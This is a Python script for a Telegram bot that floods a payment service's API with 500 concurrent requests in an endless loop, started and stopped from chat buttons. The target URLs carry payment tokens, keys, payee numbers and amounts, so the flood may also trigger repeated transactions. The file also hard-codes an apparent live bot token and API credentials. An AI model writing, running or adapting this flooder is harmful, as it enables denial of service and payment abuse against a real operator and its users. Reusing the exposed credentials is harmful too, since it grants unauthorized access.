#!/usr/bin/env python3
"""
🔥 ULTRA-PAY FLOOD BOT - Webhook Version
- 500 concurrent requests
- Real-time stats
- Webhook support for Railway
- No polling conflicts
"""

import asyncio
import aiohttp
import os
import json
import time
import logging
from datetime import datetime
from itertools import cycle
from flask import Flask, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ─── CONFIG ──────────────────────────────────────────────
BOT_TOKEN = "8711419221:AAGx9Rylji34qJeOShWZk0gQkv9YPZ7fXDo"
ADMIN_ID = 8401097557

URLS = [
    "https://148.113.13.242/APIs/api?token=IKJ6bCOnVVkb1N5K5dIHOS00T7HwxGECTdR9d6ml&key=fMdb6XOjYp6U0JDj9pSl&paytoNumber=1730611550&amount=1&comment=hi",
    "https://148.113.13.242/APIs/api?token=cUcM3sX925Z0vEqJ5Er80HNd7mpDQLHWJrlZ5Y5Ln&key=e7oIeqLCd4N32M2A&paytoNumber=9234383141&amount=1&comment=hi"
]

HEADERS = {
    "Host": "ultra-pay.in",
    "User-Agent": "Mozilla/5.0",
    "Connection": "keep-alive",
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate, br"
}

# ─── GLOBAL STATE ────────────────────────────────────────
flood_active = False
flood_task = None
stats = {
    'total': 0,
    'success': 0,
    'failed': 0,
    'timeout': 0,
    'error': 0,
    'status_codes': {}
}
start_time = None
stats_lock = asyncio.Lock()

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ─── FLOOD ENGINE ─────────────────────────────────────────
async def fetch_one(session, url, semaphore):
    global stats
    
    async with semaphore:
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=10, connect=5)) as resp:
                async with stats_lock:
                    stats['total'] += 1
                    status = resp.status
                    stats['status_codes'][status] = stats['status_codes'].get(status, 0) + 1
                    
                    if status == 200:
                        stats['success'] += 1
                    else:
                        stats['failed'] += 1
                    
                await resp.text()
                return status
                
        except asyncio.TimeoutError:
            async with stats_lock:
                stats['total'] += 1
                stats['timeout'] += 1
                stats['status_codes']['TIMEOUT'] = stats['status_codes'].get('TIMEOUT', 0) + 1
            return None
            
        except Exception as e:
            async with stats_lock:
                stats['total'] += 1
                stats['error'] += 1
                stats['status_codes']['ERROR'] = stats['status_codes'].get('ERROR', 0) + 1
            return None

async def flood_loop():
    global flood_active, start_time
    
    CONCURRENT = 500
    connector = aiohttp.TCPConnector(
        ssl=False,
        limit=0,
        ttl_dns_cache=300,
        enable_cleanup_closed=True
    )
    
    semaphore = asyncio.Semaphore(CONCURRENT)
    url_cycle = cycle(URLS)
    
    async with aiohttp.ClientSession(connector=connector, headers=HEADERS) as session:
        while flood_active:
            tasks = []
            for _ in range(CONCURRENT):
                if not flood_active:
                    break
                target_url = next(url_cycle)
                tasks.append(fetch_one(session, target_url, semaphore))
            
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
            
            await asyncio.sleep(0.01)

# ─── BOT HANDLERS ─────────────────────────────────────────
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    
    keyboard = [
        [InlineKeyboardButton("▶️ START FLOOD", callback_data="start")],
        [InlineKeyboardButton("⏹️ STOP FLOOD", callback_data="stop")],
        [InlineKeyboardButton("📊 STATUS", callback_data="stats")],
        [InlineKeyboardButton("🔄 RESET", callback_data="reset")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    status_text = "🟢 RUNNING" if flood_active else "🔴 STOPPED"
    
    await update.message.reply_text(
        f"🔥 *ULTRA-PAY FLOOD BOT*\n\n"
        f"📌 Status: {status_text}\n"
        f"📊 Total: {stats['total']}\n"
        f"✅ Success: {stats['success']}\n"
        f"❌ Failed: {stats['failed']}\n"
        f"⏰ Timeout: {stats['timeout']}\n\n"
        f"⚡ 500 Concurrent Requests\n"
        f"🌐 2 URLs Rotating\n\n"
        f"Use buttons below:",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global flood_active, flood_task, stats, start_time
    
    query = update.callback_query
    await query.answer()
    
    if update.effective_user.id != ADMIN_ID:
        await query.edit_message_text("❌ Unauthorized!")
        return
    
    action = query.data
    
    if action == "start":
        if flood_active:
            await query.edit_message_text("⚠️ Flood is already running!")
            return
        
        flood_active = True
        start_time = datetime.now()
        stats = {'total': 0, 'success': 0, 'failed': 0, 'timeout': 0, 'error': 0, 'status_codes': {}}
        flood_task = asyncio.create_task(flood_loop())
        
        await query.edit_message_text(
            "🟢 *FLOOD STARTED!*\n\n"
            "⚡ Sending 500 concurrent requests\n"
            "📊 Use 'STATUS' to see progress\n"
            "⏹️ Use 'STOP FLOOD' to stop",
            parse_mode='Markdown'
        )
        
    elif action == "stop":
        if not flood_active:
            await query.edit_message_text("⚠️ Flood is already stopped!")
            return
        
        flood_active = False
        if flood_task:
            flood_task.cancel()
            flood_task = None
        
        elapsed = (datetime.now() - start_time).total_seconds() if start_time else 0
        rate = stats['total'] / elapsed if elapsed > 0 else 0
        
        await query.edit_message_text(
            f"🔴 *FLOOD STOPPED!*\n\n"
            f"📊 *Final Statistics:*\n"
            f"📌 Total: {stats['total']}\n"
            f"✅ Success: {stats['success']}\n"
            f"❌ Failed: {stats['failed']}\n"
            f"⏰ Timeout: {stats['timeout']}\n"
            f"🔴 Errors: {stats['error']}\n"
            f"📈 Rate: {rate:.1f} req/s\n"
            f"⏱️ Time: {elapsed:.1f}s\n"
            f"📊 Status: {dict(list(stats['status_codes'].items())[:5])}",
            parse_mode='Markdown'
        )
        
    elif action == "stats":
        elapsed = (datetime.now() - start_time).total_seconds() if start_time and flood_active else 0
        rate = stats['total'] / elapsed if elapsed > 0 else 0
        success_rate = (stats['success'] / stats['total'] * 100) if stats['total'] > 0 else 0
        
        await query.edit_message_text(
            f"📊 *LIVE STATISTICS*\n\n"
            f"🟢 Status: {'🟢 RUNNING' if flood_active else '🔴 STOPPED'}\n"
            f"📌 Total: {stats['total']}\n"
            f"✅ Success: {stats['success']}\n"
            f"❌ Failed: {stats['failed']}\n"
            f"⏰ Timeout: {stats['timeout']}\n"
            f"🔴 Errors: {stats['error']}\n"
            f"📈 Rate: {success_rate:.1f}%\n"
            f"⚡ Speed: {rate:.1f} req/s\n"
            f"⏱️ Uptime: {int(elapsed)}s\n"
            f"📊 Status: {dict(list(stats['status_codes'].items())[:5])}",
            parse_mode='Markdown'
        )
        
    elif action == "reset":
        if flood_active:
            await query.edit_message_text("⚠️ Stop flood first before resetting!")
            return
        
        stats = {'total': 0, 'success': 0, 'failed': 0, 'timeout': 0, 'error': 0, 'status_codes': {}}
        start_time = None
        await query.edit_message_text("🔄 *Statistics Reset!*", parse_mode='Markdown')

# ─── FLASK APP (Webhook) ──────────────────────────────────
flask_app = Flask(__name__)
bot_app = None

@flask_app.route('/', methods=['GET'])
def home():
    return jsonify({
        'status': 'online',
        'flood': 'running' if flood_active else 'stopped',
        'total_requests': stats['total']
    })

@flask_app.route(f'/{BOT_TOKEN}', methods=['POST'])
def webhook():
    try:
        data = request.get_json(force=True)
        update = Update.de_json(data, bot_app.bot)
        asyncio.create_task(bot_app.process_update(update))
        return 'ok', 200
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return 'error', 500

# ─── MAIN ──────────────────────────────────────────────────
def main():
    global bot_app
    
    # Setup bot
    bot_app = Application.builder().token(BOT_TOKEN).build()
    bot_app.add_handler(CommandHandler("start", start))
    bot_app.add_handler(CallbackQueryHandler(button_handler))
    
    # Set webhook
    port = int(os.environ.get("PORT", 8080))
    webhook_url = f"https://{os.environ.get('RAILWAY_STATIC_URL', 'localhost')}/{BOT_TOKEN}"
    
    # Delete old webhook
    import requests
    requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook")
    
    # Set new webhook
    if os.environ.get('RAILWAY_STATIC_URL'):
        resp = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={webhook_url}")
        if resp.status_code == 200:
            logger.info(f"✅ Webhook set: {webhook_url}")
        else:
            logger.error(f"❌ Webhook failed: {resp.text}")
    
    # Start Flask
    logger.info(f"🚀 Bot starting on port {port}")
    flask_app.run(host='0.0.0.0', port=port)

if __name__ == "__main__":
    main()
